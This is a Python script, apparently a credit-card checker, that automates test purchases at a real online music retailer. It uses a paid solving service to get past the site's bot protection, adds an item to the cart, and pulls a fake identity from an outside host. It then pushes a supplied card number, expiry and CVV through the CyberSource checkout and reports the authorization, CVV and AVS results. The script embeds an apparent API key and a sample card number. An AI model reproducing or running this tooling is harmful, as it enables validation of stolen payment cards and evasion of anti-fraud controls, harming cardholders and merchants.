from concurrent.futures import ThreadPoolExecutor, as_completed
import json, random, html, time, math, string, urllib3
from curl_cffi import requests
from bs4 import BeautifulSoup
from twocaptcha import TwoCaptcha
from requests_toolbelt import MultipartEncoder
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def gt(html_content: str) -> dict:
    soup = BeautifulSoup(html_content, 'html.parser')
    post_data = {}
    
    for input_tag in soup.find_all('input'):
        name_attr = input_tag.get('name') or input_tag.get('id')
        if not name_attr:
            continue
        value_attr = input_tag.get('value', '')
        post_data[name_attr] = value_attr
    
    return post_data

def db(body: str) -> str:
    while True:
        decoded = html.unescape(body)
        if decoded == body:
            break
        body = decoded
    return body

def ps(s: str, start: str, end: str) -> str:
    if start not in s:
        return ""
    after_start = s.split(start, 1)
    if len(after_start) < 2:
        return ""
    after_end = after_start[1].split(end, 1)
    if len(after_end) < 2:
        return ""
    return after_end[0]

def tc(c: int) -> None:
    if c != 200:
        raise Exception("SERVER ERROR[SS]")

def process_card(card):
    session = requests.Session(impersonate='chrome123')

    cc, mm, yyyy, cvv = card.split("|")

    api_key = "CAP-3F95CC9D83625CD03C8B75C3E8CE0DD5C3C817EE4CFCFED8ACDF7A96779E20AB" # HERE GOES UR API KEY OF 2CAPTCHA

    urls = [
        "https://www.samash.com/hosa-gpm103-1-8-to-1-4-stereo-headphone-adapter-hgpm103",
        "https://www.samash.com/hosa-gmp467-cable-adapter-3-5mm-female-to-2-5mm-male-hgmp467xx",
        "https://www.samash.com/cta6600-cable-wraps-5-pack-octa6600x-p",
        "https://www.samash.com/hosa-high-speed-usb-type-a-to-micro-b-cable-6-ft-husb206ac",
        "https://www.samash.com/pro-interconnect-cable-1-8-35mm-trs-to-1-8-35mm-trs-3-ft-stpad883x",
        "https://www.samash.com/hosa-yra167-1-8-male-to-2-rca-female-adapter-cable-hyra167xx",
        "https://www.samash.com/hosa-cmm100-stereo-1-8-male-to-stereo-1-8-male-3-ft-hcmm103xx",
        "https://www.samash.com/hosa-ypr102-stereo-1-4-male-to-dual-rca-female-y-cable-hypr102",
        "https://www.samash.com/hosa-yra115-1-4-female-tto-rca-female-splitter-and-combiner-hyra115",
    ]

    random_url = random.choice(urls)

    session.verify = False

    r = session.get(random_url)

    dd = json.loads(ps(r.text, 'var dd=','<').replace("'", '"'))
    
    solver = TwoCaptcha(api_key)

    exception_count = 0
    max_exceptions = 5
    

    while exception_count < max_exceptions:
        try:
            solution = solver.datadome(
            captcha_url="https://geo.captcha-delivery.com/captcha/?initialCid=" + dd["cid"] +"&hash=" + dd["hsh"] +"&cid=" + dd["cookie"] +"&t=fe&referer=" + random_url +"&s=" + str(dd["s"]) +"&e=" + dd["e"] +"&dm=cd",
            pageurl=random_url ,
            userAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            proxy={
                'type': 'HTTP',
                'uri': '' # HERE GOES UR PROXY
                }
            )
            if "code" in solution:
                break

        except Exception as e:
            exception_count += 1
            if exception_count >= max_exceptions:
                raise Exception(f"MAX RETRIES[{max_exceptions}]")

    session.cookies.set("datadome", ps(solution["code"], "datadome=",";"))

    r = session.get(random_url)

    tc(r.status_code)

    atcu = ps(r.text, '<div class="product-add-form">','</div')

    atct = gt(atcu)
    atct["qty"] = "1"

    url = ps(atcu, 'action="','"')

    m = MultipartEncoder(atct)

    session.cookies.set("form_key", atct["form_key"])

    r = session.post(url, data=m.to_string(), headers={'Content-Type': m.content_type})

    r = session.get("https://www.samash.com/checkout/")

    tc(r.status_code)

    cart_id = ps(r.text, 'quoteData":{"entity_id":"','"')
    secure_token = ps(r.text, 'secure_token":"','"')

    fd = session.post(
        "https://c00p3rb0r1cu4.alwaysdata.net/fakeData.php",
        json={
            "CC":"US"
        }
    )

    fakeData = json.loads(fd.text)

    try:
        success = fakeData["success"]
    except KeyError:
        raise KeyError("SERVER ERROR[FD][0x0]")

    if success == False:
        raise ValueError("SERVER ERROR[FD][0x1]")

    regions = [
        {"state_full":"Alabama","id":"1"},
        {"state_full":"Alaska","id":"2"},
        {"state_full":"American Samoa","id":"3"},
        {"state_full":"Arizona","id":"4"},
        {"state_full":"Arkansas","id":"5"},
        {"state_full":"Armed Forces Africa","id":"6"},
        {"state_full":"Armed Forces Americas","id":"7"},
        {"state_full":"Armed Forces Canada","id":"8"},
        {"state_full":"Armed Forces Europe","id":"9"},
        {"state_full":"Armed Forces Middle East","id":"10"},
        {"state_full":"Armed Forces Pacific","id":"11"},
        {"state_full":"California","id":"12"},
        {"state_full":"Colorado","id":"13"},
        {"state_full":"Connecticut","id":"14"},
        {"state_full":"Delaware","id":"15"},
        {"state_full":"District of Columbia","id":"16"},
        {"state_full":"Federated States Of Micronesia","id":"17"},
        {"state_full":"Florida","id":"18"},
        {"state_full":"Georgia","id":"19"},
        {"state_full":"Guam","id":"20"},
        {"state_full":"Hawaii","id":"21"},
        {"state_full":"Idaho","id":"22"},
        {"state_full":"Illinois","id":"23"},
        {"state_full":"Indiana","id":"24"},
        {"state_full":"Iowa","id":"25"},
        {"state_full":"Kansas","id":"26"},
        {"state_full":"Kentucky","id":"27"},
        {"state_full":"Louisiana","id":"28"},
        {"state_full":"Maine","id":"29"},
        {"state_full":"Marshall Islands","id":"30"},
        {"state_full":"Maryland","id":"31"},
        {"state_full":"Massachusetts","id":"32"},
        {"state_full":"Michigan","id":"33"},
        {"state_full":"Minnesota","id":"34"},
        {"state_full":"Mississippi","id":"35"},
        {"state_full":"Missouri","id":"36"},
        {"state_full":"Montana","id":"37"},
        {"state_full":"Nebraska","id":"38"},
        {"state_full":"Nevada","id":"39"},
        {"state_full":"New Hampshire","id":"40"},
        {"state_full":"New Jersey","id":"41"},
        {"state_full":"New Mexico","id":"42"},
        {"state_full":"New York","id":"43"},
        {"state_full":"North Carolina","id":"44"},
        {"state_full":"North Dakota","id":"45"},
        {"state_full":"Northern Mariana Islands","id":"46"},
        {"state_full":"Ohio","id":"47"},
        {"state_full":"Oklahoma","id":"48"},
        {"state_full":"Oregon","id":"49"},
        {"state_full":"Palau","id":"50"},
        {"state_full":"Pennsylvania","id":"51"},
        {"state_full":"Puerto Rico","id":"52"},
        {"state_full":"Rhode Island","id":"53"},
        {"state_full":"South Carolina","id":"54"},
        {"state_full":"South Dakota","id":"55"},
        {"state_full":"Tennessee","id":"56"},
        {"state_full":"Texas","id":"57"},
        {"state_full":"Utah","id":"58"},
        {"state_full":"Vermont","id":"59"},
        {"state_full":"Virgin Islands","id":"60"},
        {"state_full":"Virginia","id":"61"},
        {"state_full":"Washington","id":"62"},
        {"state_full":"West Virginia","id":"63"},
        {"state_full":"Wisconsin","id":"64"},
        {"state_full":"Wyoming","id":"65"}
    ]

    region_id = {region["state_full"].lower(): region["id"] for region in regions}

    state_id = region_id.get(fakeData["stateFull"].lower())

    r = session.post(
    "https://www.samash.com/rest/default/V1/guest-carts/" + cart_id + "/estimate-shipping-methods",
    json={
    "address": {
        "street": [fakeData["street"], "", ""],
        "city": fakeData["city"],
        "region_id": state_id,
        "region": fakeData["stateFull"],
        "country_id": "US",
        "postcode": fakeData["zip"],
        "firstname": fakeData["name"],
        "lastname": fakeData["last"],
        "telephone": fakeData["phone"]
        }
    },
    headers={"Accept":"*/*"}
    )

    tc(r.status_code)

    shipping_methods = json.loads(r.text)

    ship_option_cheapest = min(
        (m for m in shipping_methods if m["available"]),
        key=lambda x: x["amount"],
        default=None
    )

    r = session.post(
        "https://www.samash.com/rest/default/V1/guest-carts/" + cart_id + "/shipping-information",
        json={
            "addressInformation": {
                "shipping_address": {
                    "countryId": "US",
                    "regionId": state_id,
                    "regionCode": fakeData["state"],
                    "region": fakeData["stateFull"],
                    "street": [fakeData["street"]],
                    "telephone": fakeData["phone"],
                    "postcode": fakeData["zip"],
                    "city": fakeData["city"],
                    "firstname": fakeData["name"],
                    "lastname": fakeData["last"]
                },
                "billing_address": {
                    "countryId": "US",
                    "regionId": state_id,
                    "regionCode": fakeData["state"],
                    "region": fakeData["stateFull"],
                    "street": [fakeData["street"]],
                    "telephone": fakeData["phone"],
                    "postcode": fakeData["zip"],
                    "city": fakeData["city"],
                    "firstname": fakeData["name"],
                    "lastname": fakeData["last"],
                    "saveInAddressBook": None
                },
                "shipping_method_code": ship_option_cheapest["method_code"],
                "shipping_carrier_code": ship_option_cheapest["carrier_code"],
                "extension_attributes": {
                    "dd_sms_consent_checkbox": False,
                    "is_subscribed": False
                }
            }
        },
        headers={"Accept":"*/*"}
    )

    tc(r.status_code)

    r = session.post(
        "https://www.samash.com/rest/default/V1/guest-carts/" + cart_id + "/set-payment-information",
        json={
            "cartId": cart_id,
            "paymentMethod": {
                "method": "chcybersource"
            },
            "email": fakeData["email"]
        },
        headers={"Accept":"*/*"}
    )

    tc(r.status_code)

    r = session.post(
        "https://www.samash.com/rest/default/V1/guest-carts/" + cart_id + "/payment-information",
        json={
            "cartId": cart_id,
            "billingAddress": {
                "countryId": "US",
                "regionId": state_id,
                "regionCode": fakeData["state"],
                "region": fakeData["stateFull"],
                "street": [fakeData["street"]],
                "telephone": fakeData["phone"],
                "postcode": fakeData["zip"],
                "city": fakeData["city"],
                "firstname": fakeData["name"],
                "lastname": fakeData["last"],
                "saveInAddressBook": None
            },
            "paymentMethod": {
                "method": "chcybersource",
                "additional_data": {
                    "ccType": {'3': 'AE', '4': 'VI', '5': 'MC', '6': 'DI'}.get(cc[0]),
                    "is_subscribed": False
                }
            },
            "email": fakeData["email"]
        },
        headers={"Accept":"*/*"}
    )

    tc(r.status_code)

    r = session.post(
        "https://www.samash.com/cybersource/index/loadSilentData/",
        data = {
            "form_key": atct["form_key"],
            "secure_token": secure_token,
            "payment": {
                "method": "chcybersource",
                "cc_type": {'3': 'AE', '4': 'VI', '5': 'MC', '6': 'DI'}.get(cc[0])
            },
            "billing-address-same-as-shipping": "on",
            "controller": "checkout_flow",
            "cc_type": {'3': 'AE', '4': 'VI', '5': 'MC', '6': 'DI'}.get(cc[0])
        },
        headers={"Accept":"*/*"}
    )

    lsd = json.loads(r.text)

    if lsd["success"] != True:
        tc(400)

    cspf = lsd["chcybersource"]["fields"]

    cspf["card_cvn"] = cvv
    cspf["card_expiry_date"] = f"{mm}-{yyyy}"
    cspf["card_number"] = cc

    r = session.post(
        "https://secureacceptance.cybersource.com/silent/pay",
        data=cspf
    )

    tc(r.status_code)

    pfs = gt(r.text)

    return f"CC: {card} | MESSAGE: {pfs["message"]} | CVV: {pfs["auth_cv_result"]} | AVS: {pfs["auth_avs_code"]} | AMOUNT: {pfs["req_amount"]}"

print(process_card("5546293007995872|04|2025|928"))